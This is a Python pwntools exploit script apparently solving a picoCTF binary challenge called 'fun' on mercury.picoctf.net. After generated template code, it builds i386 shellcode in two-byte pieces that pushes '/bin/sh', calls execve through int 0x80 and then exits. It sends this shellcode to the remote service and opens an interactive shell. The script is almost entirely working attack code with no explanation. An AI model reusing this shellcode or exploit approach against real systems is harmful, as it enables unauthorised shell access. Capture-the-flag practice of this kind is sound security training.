#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host mercury.picoctf.net --port 28494 fun
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('fun')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'mercury.picoctf.net'
port = int(args.PORT or 28494)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
    return p

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
context.terminal = ['tmux', 'splitw', '-h']
gdbscript = '''
b*0x080485c9
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x8048000)
# RWX:      Has RWX segments

io = start()

shellcode = b''

# push /bin/sh\0
shellcode += b'\x31\xc0'
shellcode += b'\x50\x90'

shellcode += b'\x04\x68'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x73'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x2f'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x2f'
shellcode += b'\x50\x90'

shellcode += b'\x31\xc0'
shellcode += b'\x04\x6e'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x69'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x62'
shellcode += b'\xd1\xe0' * 8
shellcode += b'\x04\x2f'
shellcode += b'\x50\x90'

shellcode += b'\x31\xc0'
shellcode += b'\x89\xe3'
shellcode += b'\x89\xc1'
shellcode += b'\x89\xc2'

shellcode += b'\xb0\x0b'
shellcode += b'\xcd\x80'
shellcode += b'\x31\xc0'
shellcode += b'\x40\x90'
shellcode += b'\xcd\x80'

io.sendline(shellcode)

io.interactive()

